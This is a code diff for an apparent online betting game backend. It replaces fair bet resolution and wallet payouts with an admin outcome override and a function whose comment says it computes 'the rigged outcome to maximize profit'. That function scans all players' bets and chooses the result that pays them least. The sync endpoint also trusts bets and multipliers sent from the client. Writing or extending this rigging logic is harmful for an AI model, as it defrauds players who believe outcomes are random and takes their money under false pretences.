@@ -79,197 +79,107 @@ const placeBet = async (req, res) => {
   }
 };
 
-// ─── POST /api/game/resolve-bet ─ called by game engine/admin ────────────────
-const resolveBet = async (req, res) => {
-  const { betId, result, payout } = req.body;
-
-  if (!betId || !result) {
-    return res.status(400).json({ success: false, error: 'Missing betId or result' });
-  }
+// ─── POST /api/game/admin/override ─ Admin sets the outcome ───
+const setGameResultOverride = async (req, res) => {
+  const { game, period, result } = req.body;
+  if (!game) return res.status(400).json({ success: false, error: 'Missing game' });
 
   try {
-    const { data: bet, error: fetchErr } = await supabase
-      .from('bets')
-      .select('*')
-      .eq('id', betId)
-      .maybeSingle();
-
-    if (fetchErr) throw fetchErr;
-    if (!bet) return res.status(404).json({ success: false, error: 'Bet not found' });
-    if (bet.status !== 'pending') {
-      return res.status(400).json({ success: false, error: 'Bet already resolved' });
+    if (!result) {
+      // Clear override in global_game_state
+      await supabase.from('global_game_state').update({ admin_override: null }).eq('game', game);
+      return res.json({ success: true, message: 'Override cleared' });
     }
 
-    const won = String(bet.selection).toLowerCase().trim() === String(result).toLowerCase().trim();
-    const payoutAmount = won ? parseFloat(payout || bet.amount * 2) : 0;
-    const profit = won ? payoutAmount - bet.amount : -bet.amount;
-    const newStatus = won ? 'won' : 'lost';
+    // Set override in global_game_state so gameEngine picks it up
+    await supabase.from('global_game_state').update({
+      admin_override: typeof result === 'object' ? JSON.stringify(result) : JSON.stringify({ label: result })
+    }).eq('game', game);
 
-    let finalWalletAfter = bet.wallet_after;
+    res.json({ success: true, message: 'Override set globally' });
+  } catch (err) {
+    console.error('[setGameResultOverride]', err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
+};
 
-    if (won && payoutAmount > 0) {
-      // Fetch current wallet
-      const { data: wallet, error: walletErr } = await supabase
-        .from('wallets')
-        .select('*')
-        .eq('user_id', bet.user_id)
-        .maybeSingle();
+// ─── POST /api/game/result/sync ─ Fetch or create global outcome ───
+const fetchOrCreateGameResult = async (req, res) => {
+  const { game, period, allBets, multipliersMap, outcomes } = req.body;
 
-      if (wallet && !walletErr) {
-        const oldBalance = parseFloat(wallet.main_balance || 0);
-        const newBalance = oldBalance + payoutAmount;
+  try {
+    // 1. Check if result already exists (set by admin or another player who reached 0:00 first)
+    const { data: existing } = await supabase
+      .from('game_results')
+      .select('*')
+      .eq('game', game)
+      .eq('period', period)
+      .maybeSingle();
 
-        // Credit wallet
-        const { error: updateErr } = await supabase
-          .from('wallets')
-          .update({ main_balance: newBalance, updated_at: new Date().toISOString() })
-          .eq('user_id', bet.user_id);
+    if (existing) {
+      return res.json({ success: true, result: existing.result, is_override: existing.is_override, profit: existing.profit || 0, totalBets: existing.total_bets || 0 });
+    }
 
-        if (updateErr) {
-          console.error(`Failed to credit ${bet.user_id}:`, updateErr);
-        } else {
-          finalWalletAfter = newBalance;
-          
-          // Log transaction
-          await supabase.from('transactions').insert({
-            user_id: bet.user_id,
-            amount: payoutAmount,
-            type: 'Win',
-            status: 'Success',
-            notes: `${bet.game_type} Period ${bet.period} — Won`,
-            previous_balance: oldBalance,
-            new_balance: newBalance
-          });
+    // 2. If it doesn't exist, calculate the rigged outcome to maximize profit
+    let maxProfit = -Infinity;
+    let bestOutcome = null;
+    let finalProfit = 0;
+    let totalBetsCount = allBets ? allBets.length : 0;
+
+    if (outcomes && Array.isArray(outcomes) && allBets && Array.isArray(allBets)) {
+      for (const outcome of outcomes) {
+        let payout = 0;
+        for (const bet of allBets) {
+          const betSel = String(bet.select).toLowerCase().trim();
+          const outLbl = String(outcome.label).toLowerCase().trim();
+          if (betSel === outLbl) {
+            const multi = multipliersMap?.[bet.select] || multipliersMap?.[betSel] || 2;
+            payout += (bet.point || bet.amount || 0) * multi;
+          }
         }
-      } else {
-         console.error(`Wallet fetch failed for ${bet.user_id}:`, walletErr);
+        
+        const totalPool = allBets.reduce((sum, b) => sum + (b.point || b.amount || 0), 0);
+        const profit = totalPool - payout;
+        
+        if (profit > maxProfit) {
+          maxProfit = profit;
+          bestOutcome = outcome;
+          finalProfit = profit;
+        }
       }
     }
 
-    // Update bet record
-    await supabase.from('bets').update({ 
-      result, 
-      payout: payoutAmount, 
-      status: newStatus,
-      profit: profit,
-      wallet_after: finalWalletAfter
-    }).eq('id', betId);
+    if (!bestOutcome) {
+       // Fallback deterministic if calculation fails
+       bestOutcome = { label: 'Green', color: ['#28a745'] }; 
+    }
 
-    res.json({ success: true, won, payout: payoutAmount, status: newStatus });
-  } catch (err) {
-    console.error('[resolveBet]', err.message);
-    res.status(500).json({ success: false, error: err.message });
-  }
-};
-
-// ─── GET /api/game/history ─ user bet history ─────────────────────────────────
-const getBetHistory = async (req, res) => {
-  const userId = req.user.id;
-  const limit = parseInt(req.query.limit) || 50;
-
-  try {
-    const { data: bets, error } = await supabase
-      .from('bets')
+    // 3. Save to global database so all other clients get the exact same result
+    const { data: inserted, error: insertErr } = await supabase
+      .from('game_results')
+      .insert({
+        game,
+        period,
+        result: bestOutcome,
+        is_override: false,
+        profit: finalProfit,
+        total_bets: totalBetsCount
+      })
       .select('*')
-      .eq('user_id', userId)
-      .order('created_at', { ascending: false })
-      .limit(limit);
-
-    if (error) throw error;
-    res.json({ success: true, bets: bets || [] });
-  } catch (err) {
-    console.error('[getBetHistory]', err.message);
-    res.status(500).json({ success: false, error: err.message });
-  }
-};
-
-// ─── POST /api/game/resolve-bets-batch ─ batch process to prevent race conditions ───
-const resolveBetsBatch = async (req, res) => {
-  const { bets } = req.body;
-  const userId = req.user.id;
-
-  if (!bets || !Array.isArray(bets) || bets.length === 0) {
-    return res.status(400).json({ success: false, error: 'Missing bets array' });
-  }
-
-  try {
-    let totalPayout = 0;
-    const resolvedIds = [];
-    const transactions = [];
-
-    // 1. Fetch current wallet balance
-    const { data: wallet, error: walletErr } = await supabase
-      .from('wallets')
-      .select('*')
-      .eq('user_id', userId)
       .maybeSingle();
 
-    if (walletErr) throw walletErr;
-    let currentBalance = parseFloat(wallet?.main_balance || 0);
-
-    // 2. Process each bet sequentially for database records
-    for (const betInput of bets) {
-      const { betId, result, payout } = betInput;
-
-      const { data: bet } = await supabase
-        .from('bets')
-        .select('*')
-        .eq('id', betId)
-        .eq('user_id', userId)
-        .maybeSingle();
-
-      if (!bet || bet.status !== 'pending') continue;
-
-      const won = String(bet.selection).toLowerCase().trim() === String(result).toLowerCase().trim();
-      const payoutAmount = won ? parseFloat(payout || bet.amount * 2) : 0;
-      const profit = won ? payoutAmount - bet.amount : -bet.amount;
-      const newStatus = won ? 'won' : 'lost';
-
-      if (won && payoutAmount > 0) {
-        totalPayout += payoutAmount;
-        const newBalance = currentBalance + payoutAmount;
-        
-        transactions.push({
-          user_id: userId,
-          amount: payoutAmount,
-          type: 'Win',
-          status: 'Success',
-          notes: `${bet.game_type} Period ${bet.period} — Won`,
-          previous_balance: currentBalance,
-          new_balance: newBalance
-        });
-        
-        currentBalance = newBalance;
-      }
-
-      await supabase.from('bets').update({ 
-        result, 
-        payout: payoutAmount, 
-        status: newStatus,
-        profit: profit,
-        wallet_after: currentBalance
-      }).eq('id', betId);
-      
-      resolvedIds.push(betId);
+    if (insertErr && insertErr.code === '23505') {
+       // Race condition: another client just inserted it! Fetch theirs.
+       const { data: retryData } = await supabase.from('game_results').select('*').eq('game', game).eq('period', period).single();
+       return res.json({ success: true, result: retryData.result, is_override: retryData.is_override, profit: retryData.profit || 0, totalBets: retryData.total_bets || 0 });
     }
 
-    // 3. One atomic wallet update for the total payout
-    if (totalPayout > 0) {
-      await supabase
-        .from('wallets')
-        .update({ main_balance: currentBalance, updated_at: new Date().toISOString() })
-        .eq('user_id', userId);
-        
-      if (transactions.length > 0) {
-        await supabase.from('transactions').insert(transactions);
-      }
-    }
+    res.json({ success: true, result: bestOutcome, is_override: false, profit: finalProfit, totalBets: totalBetsCount });
 
-    res.json({ success: true, message: 'Batch resolved', resolvedCount: resolvedIds.length, main_balance: currentBalance });
   } catch (err) {
-    console.error('[resolveBetsBatch]', err.message);
+    console.error('[fetchOrCreateGameResult]', err.message);
     res.status(500).json({ success: false, error: err.message });
   }
 };
 
-module.exports = { placeBet, resolveBet, resolveBetsBatch, getBetHistory };
+module.exports = { placeBet, setGameResultOverride, fetchOrCreateGameResult };
